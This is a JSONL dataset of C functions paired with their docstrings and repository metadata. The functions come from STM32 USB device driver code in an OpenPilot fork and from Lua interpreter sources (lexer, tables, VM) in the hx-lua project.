{"docstring": "/*******************************************************************************\n* Function Name  : Standard_SetEndPointFeature\n* Description    : Set or enable a specific feature of EndPoint\n* Input          : None.\n* Output         : None.\n* Return         : - Return USB_SUCCESS, if the request is performed.\n*                  - Return USB_UNSUPPORT, if the request is invalid.\n*******************************************************************************/\n", "func_signal": "RESULT Standard_SetEndPointFeature(void)", "code": "{\n  uint32_t    wIndex0;\n  uint32_t    Related_Endpoint;\n  uint32_t    rEP;\n  uint32_t    Status;\n\n  wIndex0 = pInformation->USBwIndex0;\n  rEP = wIndex0 & ~0x80;\n  Related_Endpoint = ENDP0 + rEP;\n\n  if (ValBit(pInformation->USBwIndex0, 7))\n  {\n    /* get Status of endpoint & stall the request if the related_ENdpoint\n    is Disabled*/\n    Status = _GetEPTxStatus(Related_Endpoint);\n  }\n  else\n  {\n    Status = _GetEPRxStatus(Related_Endpoint);\n  }\n\n  if (Related_Endpoint >= Device_Table.Total_Endpoint\n      || pInformation->USBwValue != 0 || Status == 0\n      || pInformation->Current_Configuration == 0)\n  {\n    return USB_UNSUPPORT;\n  }\n  else\n  {\n    if (wIndex0 & 0x80)\n    {\n      /* IN endpoint */\n      _SetEPTxStatus(Related_Endpoint, EP_TX_STALL);\n    }\n\n    else\n    {\n      /* OUT endpoint */\n      _SetEPRxStatus(Related_Endpoint, EP_RX_STALL);\n    }\n  }\n  pUser_Standard_Requests->User_SetEndPointFeature();\n  return USB_SUCCESS;\n}", "path": "flight\\PiOS\\STM32F10x\\Libraries\\STM32_USB-FS-Device_Driver\\src\\usb_core.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/*******************************************************************************\n* Function Name  : Standard_SetInterface.\n* Description    : This routine is called to set the interface.\n*                  Then each class should configure the interface them self.\n* Input          : None.\n* Output         : None.\n* Return         : - Return USB_SUCCESS, if the request is performed.\n*                  - Return USB_UNSUPPORT, if the request is invalid.\n*******************************************************************************/\n", "func_signal": "RESULT Standard_SetInterface(void)", "code": "{\n  RESULT Re;\n  /*Test if the specified Interface and Alternate Setting are supported by\n    the application Firmware*/\n  Re = (*pProperty->Class_Get_Interface_Setting)(pInformation->USBwIndex0, pInformation->USBwValue0);\n\n  if (pInformation->Current_Configuration != 0)\n  {\n    if ((Re != USB_SUCCESS) || (pInformation->USBwIndex1 != 0)\n        || (pInformation->USBwValue1 != 0))\n    {\n      return  USB_UNSUPPORT;\n    }\n    else if (Re == USB_SUCCESS)\n    {\n      pUser_Standard_Requests->User_SetInterface();\n      pInformation->Current_Interface = pInformation->USBwIndex0;\n      pInformation->Current_AlternateSetting = pInformation->USBwValue0;\n      return USB_SUCCESS;\n    }\n\n  }\n\n  return USB_UNSUPPORT;\n}", "path": "flight\\PiOS\\STM32F10x\\Libraries\\STM32_USB-FS-Device_Driver\\src\\usb_core.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/*******************************************************************************\n* Function Name  : Out0_Process\n* Description    : Process the OUT token on all default endpoint.\n* Input          : None.\n* Output         : None.\n* Return         : Post0_Process.\n*******************************************************************************/\n", "func_signal": "uint8_t Out0_Process(void)", "code": "{\n  uint32_t ControlState = pInformation->ControlState;\n\n  if ((ControlState == IN_DATA) || (ControlState == LAST_IN_DATA))\n  {\n    /* host aborts the transfer before finish */\n    ControlState = STALLED;\n  }\n  else if ((ControlState == OUT_DATA) || (ControlState == LAST_OUT_DATA))\n  {\n    DataStageOut();\n    ControlState = pInformation->ControlState; /* may be changed outside the function */\n  }\n\n  else if (ControlState == WAIT_STATUS_OUT)\n  {\n    (*pProperty->Process_Status_OUT)();\n  #ifndef STM32F10X_CL\n    ControlState = STALLED;\n  #endif /* STM32F10X_CL */\n  }\n\n\n  /* Unexpect state, STALL the endpoint */\n  else\n  {\n    ControlState = STALLED;\n  }\n\n  pInformation->ControlState = ControlState;\n\n  return Post0_Process();\n}", "path": "flight\\PiOS\\STM32F10x\\Libraries\\STM32_USB-FS-Device_Driver\\src\\usb_core.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/*******************************************************************************\n* Function Name  : Data_Setup0.\n* Description    : Proceed the processing of setup request with data stage.\n* Input          : None.\n* Output         : None.\n* Return         : None.\n*******************************************************************************/\n", "func_signal": "void Data_Setup0(void)", "code": "{\n  const uint8_t *(*CopyRoutine)(uint16_t);\n  RESULT Result;\n  uint32_t Request_No = pInformation->USBbRequest;\n\n  uint32_t Related_Endpoint, Reserved;\n  uint32_t wOffset, Status;\n\n\n\n  CopyRoutine = NULL;\n  wOffset = 0;\n\n  /*GET DESCRIPTOR*/\n  if (Request_No == GET_DESCRIPTOR)\n  {\n    if (Type_Recipient == (STANDARD_REQUEST | DEVICE_RECIPIENT))\n    {\n      uint8_t wValue1 = pInformation->USBwValue1;\n      if (wValue1 == DEVICE_DESCRIPTOR)\n      {\n        CopyRoutine = pProperty->GetDeviceDescriptor;\n      }\n      else if (wValue1 == CONFIG_DESCRIPTOR)\n      {\n        CopyRoutine = pProperty->GetConfigDescriptor;\n      }\n      else if (wValue1 == STRING_DESCRIPTOR)\n      {\n        CopyRoutine = pProperty->GetStringDescriptor;\n      }  /* End of GET_DESCRIPTOR */\n    }\n  }\n\n  /*GET STATUS*/\n  else if ((Request_No == GET_STATUS) && (pInformation->USBwValue == 0)\n           && (pInformation->USBwLength == 0x0002)\n           && (pInformation->USBwIndex1 == 0))\n  {\n    /* GET STATUS for Device*/\n    if ((Type_Recipient == (STANDARD_REQUEST | DEVICE_RECIPIENT))\n        && (pInformation->USBwIndex == 0))\n    {\n      CopyRoutine = Standard_GetStatus;\n    }\n\n    /* GET STATUS for Interface*/\n    else if (Type_Recipient == (STANDARD_REQUEST | INTERFACE_RECIPIENT))\n    {\n      if (((*pProperty->Class_Get_Interface_Setting)(pInformation->USBwIndex0, 0) == USB_SUCCESS)\n          && (pInformation->Current_Configuration != 0))\n      {\n        CopyRoutine = Standard_GetStatus;\n      }\n    }\n\n    /* GET STATUS for EndPoint*/\n    else if (Type_Recipient == (STANDARD_REQUEST | ENDPOINT_RECIPIENT))\n    {\n      Related_Endpoint = (pInformation->USBwIndex0 & 0x0f);\n      Reserved = pInformation->USBwIndex0 & 0x70;\n\n      if (ValBit(pInformation->USBwIndex0, 7))\n      {\n        /*Get Status of endpoint & stall the request if the related_ENdpoint\n        is Disabled*/\n        Status = _GetEPTxStatus(Related_Endpoint);\n      }\n      else\n      {\n        Status = _GetEPRxStatus(Related_Endpoint);\n      }\n\n      if ((Related_Endpoint < Device_Table.Total_Endpoint) && (Reserved == 0)\n          && (Status != 0))\n      {\n        CopyRoutine = Standard_GetStatus;\n      }\n    }\n\n  }\n\n  /*GET CONFIGURATION*/\n  else if (Request_No == GET_CONFIGURATION)\n  {\n    if (Type_Recipient == (STANDARD_REQUEST | DEVICE_RECIPIENT))\n    {\n      CopyRoutine = Standard_GetConfiguration;\n    }\n  }\n  /*GET INTERFACE*/\n  else if (Request_No == GET_INTERFACE)\n  {\n    if ((Type_Recipient == (STANDARD_REQUEST | INTERFACE_RECIPIENT))\n        && (pInformation->Current_Configuration != 0) && (pInformation->USBwValue == 0)\n        && (pInformation->USBwIndex1 == 0) && (pInformation->USBwLength == 0x0001)\n        && ((*pProperty->Class_Get_Interface_Setting)(pInformation->USBwIndex0, 0) == USB_SUCCESS))\n    {\n      CopyRoutine = Standard_GetInterface;\n    }\n\n  }\n  \n  if (CopyRoutine)\n  {\n    pInformation->Ctrl_Info.Usb_wOffset = wOffset;\n    pInformation->Ctrl_Info.CopyDataIn = CopyRoutine;\n    /* sb in the original the cast to word was directly */\n    /* now the cast is made step by step */\n    (*CopyRoutine)(0);\n    Result = USB_SUCCESS;\n  }\n  else\n  {\n    Result = (*pProperty->Class_Data_Setup)(pInformation->USBbRequest);\n    if (Result == USB_NOT_READY)\n    {\n      pInformation->ControlState = PAUSE;\n      return;\n    }\n  }\n\n  if (pInformation->Ctrl_Info.Usb_wLength == 0xFFFF)\n  {\n    /* Data is not ready, wait it */\n    pInformation->ControlState = PAUSE;\n    return;\n  }\n  if ((Result == USB_UNSUPPORT) || (pInformation->Ctrl_Info.Usb_wLength == 0))\n  {\n    /* Unsupported request */\n    pInformation->ControlState = STALLED;\n    return;\n  }\n\n\n  if (ValBit(pInformation->USBbmRequestType, 7))\n  {\n    /* Device ==> Host */\n    __IO uint32_t wLength = pInformation->USBwLength;\n     \n    /* Restrict the data length to be the one host asks for */\n    if (pInformation->Ctrl_Info.Usb_wLength > wLength)\n    {\n      pInformation->Ctrl_Info.Usb_wLength = wLength;\n    }\n    \n    else if (pInformation->Ctrl_Info.Usb_wLength < pInformation->USBwLength)\n    {\n      if (pInformation->Ctrl_Info.Usb_wLength < pProperty->MaxPacketSize)\n      {\n        Data_Mul_MaxPacketSize = FALSE;\n      }\n      else if ((pInformation->Ctrl_Info.Usb_wLength % pProperty->MaxPacketSize) == 0)\n      {\n        Data_Mul_MaxPacketSize = TRUE;\n      }\n    }   \n\n    pInformation->Ctrl_Info.PacketSize = pProperty->MaxPacketSize;\n    DataStageIn();\n  }\n  else\n  {\n    pInformation->ControlState = OUT_DATA;\n    vSetEPRxStatus(EP_RX_VALID); /* enable for next data reception */\n  }\n\n  return;\n}", "path": "flight\\PiOS\\STM32F10x\\Libraries\\STM32_USB-FS-Device_Driver\\src\\usb_core.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/*******************************************************************************\n* Function Name  : Standard_SetDeviceFeature.\n* Description    : Set or enable a specific feature of Device.\n* Input          : None.\n* Output         : None.\n* Return         : - Return USB_SUCCESS, if the request is performed.\n*                  - Return USB_UNSUPPORT, if the request is invalid.\n*******************************************************************************/\n", "func_signal": "RESULT Standard_SetDeviceFeature(void)", "code": "{\n  SetBit(pInformation->Current_Feature, 5);\n  pUser_Standard_Requests->User_SetDeviceFeature();\n  return USB_SUCCESS;\n}", "path": "flight\\PiOS\\STM32F10x\\Libraries\\STM32_USB-FS-Device_Driver\\src\\usb_core.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/**\n* Sends a package over given port\n* \\param[in] port COM port\n* \\param[in] buffer character buffer\n* \\param[in] len buffer length\n* \\return -1 if port not available\n* \\return -2 if non-blocking mode activated: buffer is full\n*            caller should retry until buffer is free again\n* \\return 0 on success\n*/\n", "func_signal": "int32_t PIOS_COM_SendBufferNonBlocking(uint8_t port, uint8_t *buffer, uint16_t len)", "code": "{\n  struct pios_com_dev * com_dev;\n\n  com_dev = find_com_dev_by_id (port);\n\n  if (!com_dev) {\n    /* Undefined COM port for this board (see pios_board.c) */\n    return -1;\n  }\n\n  /* Invoke the driver function if it exists */\n  if (com_dev->driver->tx_nb) {\n    return com_dev->driver->tx_nb(com_dev->id, (char *)buffer, len);\n  }\n\n  return 0;\n}", "path": "flight\\PiOS.win32\\win32\\pios_com.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/*******************************************************************************\n* Function Name  : Standard_GetInterface.\n* Description    : Return the Alternate Setting of the current interface.\n* Input          : Length - How many bytes are needed.\n* Output         : None.\n* Return         : Return 0, if the request is invalid when \"Length\" is 0.\n*                  Return \"Buffer\" if the \"Length\" is not 0.\n*******************************************************************************/\n", "func_signal": "const uint8_t *Standard_GetInterface(uint16_t Length)", "code": "{\n  if (Length == 0)\n  {\n    pInformation->Ctrl_Info.Usb_wLength =\n      sizeof(pInformation->Current_AlternateSetting);\n    return 0;\n  }\n  pUser_Standard_Requests->User_GetInterface();\n  return (uint8_t *)&pInformation->Current_AlternateSetting;\n}", "path": "flight\\PiOS\\STM32F10x\\Libraries\\STM32_USB-FS-Device_Driver\\src\\usb_core.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/*\n** equality of Lua values. L == NULL means raw equality (no metamethods)\n*/\n", "func_signal": "int luaV_equalobj_ (lua_State *L, const TValue *t1, const TValue *t2)", "code": "{\n  const TValue *tm;\n  lua_assert(ttisequal(t1, t2));\n  switch (ttype(t1)) {\n    case LUA_TNIL: return 1;\n    case LUA_TNUMBER: return luai_numeq(nvalue(t1), nvalue(t2));\n    case LUA_TBOOLEAN: return bvalue(t1) == bvalue(t2);  /* true must be 1 !! */\n    case LUA_TLIGHTUSERDATA: return pvalue(t1) == pvalue(t2);\n    case LUA_TLCF: return fvalue(t1) == fvalue(t2);\n    case LUA_TSHRSTR: return eqshrstr(rawtsvalue(t1), rawtsvalue(t2));\n    case LUA_TLNGSTR: return luaS_eqlngstr(rawtsvalue(t1), rawtsvalue(t2));\n    case LUA_TUSERDATA: {\n      if (uvalue(t1) == uvalue(t2)) return 1;\n      else if (L == NULL) return 0;\n      tm = get_equalTM(L, uvalue(t1)->metatable, uvalue(t2)->metatable, TM_EQ);\n      break;  /* will try TM */\n    }\n    case LUA_TTABLE: {\n      if (hvalue(t1) == hvalue(t2)) return 1;\n      else if (L == NULL) return 0;\n      tm = get_equalTM(L, hvalue(t1)->metatable, hvalue(t2)->metatable, TM_EQ);\n      break;  /* will try TM */\n    }\n    default:\n      lua_assert(iscollectable(t1));\n      return gcvalue(t1) == gcvalue(t2);\n  }\n  if (tm == NULL) return 0;  /* no TM? */\n  callTM(L, tm, t1, t2, L->top, 1);  /* call TM */\n  return !l_isfalse(L->top);\n}", "path": "project\\lua\\lvm.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/* the next function is called unprotected, so it must avoid errors */\n", "func_signal": "static void finalreport (lua_State *L, int status)", "code": "{\n  if (status != LUA_OK) {\n    const char *msg = (lua_type(L, -1) == LUA_TSTRING) ? lua_tostring(L, -1)\n                                                       : NULL;\n    if (msg == NULL) msg = \"(error object is not a string)\";\n    l_message(progname, msg);\n    lua_pop(L, 1);\n  }\n}", "path": "project\\lua\\lua.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** in case of format error, try to change decimal point separator to\n** the one defined in the current locale and check again\n*/\n", "func_signal": "static void trydecpoint (LexState *ls, SemInfo *seminfo)", "code": "{\n  char old = ls->decpoint;\n  ls->decpoint = getlocaledecpoint();\n  buffreplace(ls, old, ls->decpoint);  /* try new decimal separator */\n  if (!buff2d(ls->buff, &seminfo->r)) {\n    /* format error with correct decimal point: no more options */\n    buffreplace(ls, ls->decpoint, '.');  /* undo change (for error message) */\n    lexerror(ls, \"malformed number\", TK_NUMBER);\n  }\n}", "path": "project\\lua\\llex.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** =======================================================\n** LEXICAL ANALYZER\n** =======================================================\n*/\n", "func_signal": "static int check_next (LexState *ls, const char *set)", "code": "{\n  if (ls->current == '\\0' || !strchr(set, ls->current))\n    return 0;\n  save_and_next(ls);\n  return 1;\n}", "path": "project\\lua\\llex.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** change all characters 'from' in buffer to 'to'\n*/\n", "func_signal": "static void buffreplace (LexState *ls, char from, char to)", "code": "{\n  size_t n = luaZ_bufflen(ls->buff);\n  char *p = luaZ_buffer(ls->buff);\n  while (n--)\n    if (p[n] == from) p[n] = to;\n}", "path": "project\\lua\\llex.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** }=============================================================\n*/\n", "func_signal": "Table *luaH_new (lua_State *L)", "code": "{\n  Table *t = &luaC_newobj(L, LUA_TTABLE, sizeof(Table), NULL, 0)->h;\n  t->metatable = NULL;\n  t->flags = cast_byte(~0);\n  t->array = NULL;\n  t->sizearray = 0;\n  setnodevector(L, t, 0);\n  return t;\n}", "path": "project\\lua\\ltable.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/* LUA_NUMBER */\n/*\n** this function is quite liberal in what it accepts, as 'luaO_str2d'\n** will reject ill-formed numerals.\n*/\n", "func_signal": "static void read_numeral (LexState *ls, SemInfo *seminfo)", "code": "{\n  const char *expo = \"Ee\";\n  int first = ls->current;\n  lua_assert(lisdigit(ls->current));\n  save_and_next(ls);\n  if (first == '0' && check_next(ls, \"Xx\"))  /* hexadecimal? */\n    expo = \"Pp\";\n  for (;;) {\n    if (check_next(ls, expo))  /* exponent part? */\n      check_next(ls, \"+-\");  /* optional exponent sign */\n    if (lisxdigit(ls->current) || ls->current == '.')\n      save_and_next(ls);\n    else  break;\n  }\n  save(ls, '\\0');\n  buffreplace(ls, '.', ls->decpoint);  /* follow locale for decimal point */\n  if (!buff2d(ls->buff, &seminfo->r))  /* format error? */\n    trydecpoint(ls, seminfo); /* try to update decimal point separator */\n}", "path": "project\\lua\\llex.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** returns the `main' position of an element in a table (that is, the index\n** of its hash value)\n*/\n", "func_signal": "static Node *mainposition (const Table *t, const TValue *key)", "code": "{\n  switch (ttype(key)) {\n    case LUA_TNUMBER:\n      return hashnum(t, nvalue(key));\n    case LUA_TLNGSTR: {\n      TString *s = rawtsvalue(key);\n      if (s->tsv.extra == 0) {  /* no hash? */\n        s->tsv.hash = luaS_hash(getstr(s), s->tsv.len, s->tsv.hash);\n        s->tsv.extra = 1;  /* now it has its hash */\n      }\n      return hashstr(t, rawtsvalue(key));\n    }\n    case LUA_TSHRSTR:\n      return hashstr(t, rawtsvalue(key));\n    case LUA_TBOOLEAN:\n      return hashboolean(t, bvalue(key));\n    case LUA_TLIGHTUSERDATA:\n      return hashpointer(t, pvalue(key));\n    case LUA_TLCF:\n      return hashpointer(t, fvalue(key));\n    default:\n      return hashpointer(t, gcvalue(key));\n  }\n}", "path": "project\\lua\\ltable.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** finish execution of an opcode interrupted by an yield\n*/\n", "func_signal": "void luaV_finishOp (lua_State *L)", "code": "{\n  CallInfo *ci = L->ci;\n  StkId base = ci->u.l.base;\n  Instruction inst = *(ci->u.l.savedpc - 1);  /* interrupted instruction */\n  OpCode op = GET_OPCODE(inst);\n  switch (op) {  /* finish its execution */\n    case OP_ADD: case OP_SUB: case OP_MUL: case OP_DIV:\n    case OP_MOD: case OP_POW: case OP_UNM: case OP_LEN:\n    case OP_GETTABUP: case OP_GETTABLE: case OP_SELF: {\n      setobjs2s(L, base + GETARG_A(inst), --L->top);\n      break;\n    }\n    case OP_LE: case OP_LT: case OP_EQ: {\n      int res = !l_isfalse(L->top - 1);\n      L->top--;\n      /* metamethod should not be called when operand is K */\n      lua_assert(!ISK(GETARG_B(inst)));\n      if (op == OP_LE &&  /* \"<=\" using \"<\" instead? */\n          ttisnil(luaT_gettmbyobj(L, base + GETARG_B(inst), TM_LE)))\n        res = !res;  /* invert result */\n      lua_assert(GET_OPCODE(*ci->u.l.savedpc) == OP_JMP);\n      if (res != GETARG_A(inst))  /* condition failed? */\n        ci->u.l.savedpc++;  /* skip jump instruction */\n      break;\n    }\n    case OP_CONCAT: {\n      StkId top = L->top - 1;  /* top when 'call_binTM' was called */\n      int b = GETARG_B(inst);      /* first element to concatenate */\n      int total = cast_int(top - 1 - (base + b));  /* yet to concatenate */\n      setobj2s(L, top - 2, top);  /* put TM result in proper position */\n      if (total > 1) {  /* are there elements to concat? */\n        L->top = top - 1;  /* top is one after last element (at top-2) */\n        luaV_concat(L, total);  /* concat them (may yield again) */\n      }\n      /* move final result to final position */\n      setobj2s(L, ci->u.l.base + GETARG_A(inst), L->top - 1);\n      L->top = ci->top;  /* restore top */\n      break;\n    }\n    case OP_TFORCALL: {\n      lua_assert(GET_OPCODE(*ci->u.l.savedpc) == OP_TFORLOOP);\n      L->top = ci->top;  /* correct top */\n      break;\n    }\n    case OP_CALL: {\n      if (GETARG_C(inst) - 1 >= 0)  /* nresults >= 0? */\n        L->top = ci->top;  /* adjust results */\n      break;\n    }\n    case OP_TAILCALL: case OP_SETTABUP: case OP_SETTABLE:\n      break;\n    default: lua_assert(0);\n  }\n}", "path": "project\\lua\\lvm.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** check whether cached closure in prototype 'p' may be reused, that is,\n** whether there is a cached closure with the same upvalues needed by\n** new closure to be created.\n*/\n", "func_signal": "static Closure *getcached (Proto *p, UpVal **encup, StkId base)", "code": "{\n  Closure *c = p->cache;\n  if (c != NULL) {  /* is there a cached closure? */\n    int nup = p->sizeupvalues;\n    Upvaldesc *uv = p->upvalues;\n    int i;\n    for (i = 0; i < nup; i++) {  /* check whether it has right upvalues */\n      TValue *v = uv[i].instack ? base + uv[i].idx : encup[uv[i].idx]->v;\n      if (c->l.upvals[i]->v != v)\n        return NULL;  /* wrong upvalue; cannot reuse closure */\n    }\n  }\n  return c;  /* return cached closure (or NULL if no cached closure) */\n}", "path": "project\\lua\\lvm.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** returns the index for `key' if `key' is an appropriate key to live in\n** the array part of the table, -1 otherwise.\n*/\n", "func_signal": "static int arrayindex (const TValue *key)", "code": "{\n  if (ttisnumber(key)) {\n    lua_Number n = nvalue(key);\n    int k;\n    lua_number2int(k, n);\n    if (luai_numeq(cast_num(k), n))\n      return k;\n  }\n  return -1;  /* `key' did not match some condition */\n}", "path": "project\\lua\\ltable.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** skip a sequence '[=*[' or ']=*]' and return its number of '='s or\n** -1 if sequence is malformed\n*/\n", "func_signal": "static int skip_sep (LexState *ls)", "code": "{\n  int count = 0;\n  int s = ls->current;\n  lua_assert(s == '[' || s == ']');\n  save_and_next(ls);\n  while (ls->current == '=') {\n    save_and_next(ls);\n    count++;\n  }\n  return (ls->current == s) ? count : (-count) - 1;\n}", "path": "project\\lua\\llex.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** increment line number and skips newline sequence (any of\n** \\n, \\r, \\n\\r, or \\r\\n)\n*/\n", "func_signal": "static void inclinenumber (LexState *ls)", "code": "{\n  int old = ls->current;\n  lua_assert(currIsNewline(ls));\n  next(ls);  /* skip `\\n' or `\\r' */\n  if (currIsNewline(ls) && ls->current != old)\n    next(ls);  /* skip `\\n\\r' or `\\r\\n' */\n  if (++ls->linenumber >= MAX_INT)\n    luaX_syntaxerror(ls, \"chunk has too many lines\");\n}", "path": "project\\lua\\llex.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** Try to find a boundary in table `t'. A `boundary' is an integer index\n** such that t[i] is non-nil and t[i+1] is nil (and 0 if t[1] is nil).\n*/\n", "func_signal": "int luaH_getn (Table *t)", "code": "{\n  unsigned int j = t->sizearray;\n  if (j > 0 && ttisnil(&t->array[j - 1])) {\n    /* there is a boundary in the array part: (binary) search for it */\n    unsigned int i = 0;\n    while (j - i > 1) {\n      unsigned int m = (i+j)/2;\n      if (ttisnil(&t->array[m - 1])) j = m;\n      else i = m;\n    }\n    return i;\n  }\n  /* else must find a boundary in hash part */\n  else if (isdummy(t->node))  /* hash part is empty? */\n    return j;  /* that is easy... */\n  else return unbound_search(t, j);\n}", "path": "project\\lua\\ltable.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** search function for short strings\n*/\n", "func_signal": "const TValue *luaH_getstr (Table *t, TString *key)", "code": "{\n  Node *n = hashstr(t, key);\n  lua_assert(key->tsv.tt == LUA_TSHRSTR);\n  do {  /* check whether `key' is somewhere in the chain */\n    if (ttisshrstring(gkey(n)) && eqshrstr(rawtsvalue(gkey(n)), key))\n      return gval(n);  /* that's it */\n    else n = gnext(n);\n  } while (n);\n  return luaO_nilobject;\n}", "path": "project\\lua\\ltable.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** hash for lua_Numbers\n*/\n", "func_signal": "static Node *hashnum (const Table *t, lua_Number n)", "code": "{\n  int i;\n  luai_hashnum(i, n);\n  if (i < 0) {\n    if (cast(unsigned int, i) == 0u - i)  /* use unsigned to avoid overflows */\n      i = 0;  /* handle INT_MIN */\n    i = -i;  /* must be a positive value */\n  }\n  return hashmod(t, i);\n}", "path": "project\\lua\\ltable.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** creates a new string and anchors it in function's table so that\n** it will not be collected until the end of the function's compilation\n** (by that time it should be anchored in function's prototype)\n*/\n", "func_signal": "TString *luaX_newstring (LexState *ls, const char *str, size_t l)", "code": "{\n  lua_State *L = ls->L;\n  TValue *o;  /* entry for `str' */\n  TString *ts = luaS_newlstr(L, str, l);  /* create new string */\n  setsvalue2s(L, L->top++, ts);  /* temporarily anchor it in stack */\n  o = luaH_set(L, ls->fs->h, L->top - 1);\n  if (ttisnil(o)) {  /* not in use yet? (see 'addK') */\n    /* boolean value does not need GC barrier;\n       table has no metatable, so it does not need to invalidate cache */\n    setbvalue(o, 1);  /* t[string] = true */\n    luaC_checkGC(L);\n  }\n  else {  /* string already present */\n    ts = rawtsvalue(keyfromval(o));  /* re-use value previously stored */\n  }\n  L->top--;  /* remove string from stack */\n  return ts;\n}", "path": "project\\lua\\llex.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** search function for integers\n*/\n", "func_signal": "const TValue *luaH_getint (Table *t, int key)", "code": "{\n  /* (1 <= key && key <= t->sizearray) */\n  if (cast(unsigned int, key-1) < cast(unsigned int, t->sizearray))\n    return &t->array[key-1];\n  else {\n    lua_Number nk = cast_num(key);\n    Node *n = hashnum(t, nk);\n    do {  /* check whether `key' is somewhere in the chain */\n      if (ttisnumber(gkey(n)) && luai_numeq(nvalue(gkey(n)), nk))\n        return gval(n);  /* that's it */\n      else n = gnext(n);\n    } while (n);\n    return luaO_nilobject;\n  }\n}", "path": "project\\lua\\ltable.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** create a new Lua closure, push it in the stack, and initialize\n** its upvalues. Note that the call to 'luaC_barrierproto' must come\n** before the assignment to 'p->cache', as the function needs the\n** original value of that field.\n*/\n", "func_signal": "static void pushclosure (lua_State *L, Proto *p, UpVal **encup, StkId base,\n                         StkId ra)", "code": "{\n  int nup = p->sizeupvalues;\n  Upvaldesc *uv = p->upvalues;\n  int i;\n  Closure *ncl = luaF_newLclosure(L, nup);\n  ncl->l.p = p;\n  setclLvalue(L, ra, ncl);  /* anchor new closure in stack */\n  for (i = 0; i < nup; i++) {  /* fill in its upvalues */\n    if (uv[i].instack)  /* upvalue refers to local variable? */\n      ncl->l.upvals[i] = luaF_findupval(L, base + uv[i].idx);\n    else  /* get upvalue from enclosing function */\n      ncl->l.upvals[i] = encup[uv[i].idx];\n  }\n  luaC_barrierproto(L, p, ncl);\n  p->cache = ncl;  /* save it on cache for reuse */\n}", "path": "project\\lua\\lvm.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
{"docstring": "/*\n** inserts a new key into a hash table; first, check whether key's main\n** position is free. If not, check whether colliding node is in its main\n** position or not: if it is not, move colliding node to an empty place and\n** put new key in its main position; otherwise (colliding node is in its main\n** position), new key goes to an empty position.\n*/\n", "func_signal": "TValue *luaH_newkey (lua_State *L, Table *t, const TValue *key)", "code": "{\n  Node *mp;\n  if (ttisnil(key)) luaG_runerror(L, \"table index is nil\");\n  else if (ttisnumber(key) && luai_numisnan(L, nvalue(key)))\n    luaG_runerror(L, \"table index is NaN\");\n  mp = mainposition(t, key);\n  if (!ttisnil(gval(mp)) || isdummy(mp)) {  /* main position is taken? */\n    Node *othern;\n    Node *n = getfreepos(t);  /* get a free place */\n    if (n == NULL) {  /* cannot find a free place? */\n      rehash(L, t, key);  /* grow table */\n      /* whatever called 'newkey' take care of TM cache and GC barrier */\n      return luaH_set(L, t, key);  /* insert key into grown table */\n    }\n    lua_assert(!isdummy(n));\n    othern = mainposition(t, gkey(mp));\n    if (othern != mp) {  /* is colliding node out of its main position? */\n      /* yes; move colliding node into free position */\n      while (gnext(othern) != mp) othern = gnext(othern);  /* find previous */\n      gnext(othern) = n;  /* redo the chain with `n' in place of `mp' */\n      *n = *mp;  /* copy colliding node into free pos. (mp->next also goes) */\n      gnext(mp) = NULL;  /* now `mp' is free */\n      setnilvalue(gval(mp));\n    }\n    else {  /* colliding node is in its own main position */\n      /* new node will go into free position */\n      gnext(n) = gnext(mp);  /* chain new position */\n      gnext(mp) = n;\n      mp = n;\n    }\n  }\n  setobj2t(L, gkey(mp), key);\n  luaC_barrierback(L, obj2gco(t), key);\n  lua_assert(ttisnil(gval(mp)));\n  return gval(mp);\n}", "path": "project\\lua\\ltable.c", "repo_name": "MattTuttle/hx-lua", "stars": 40, "license": "None", "language": "c", "size": 2190}
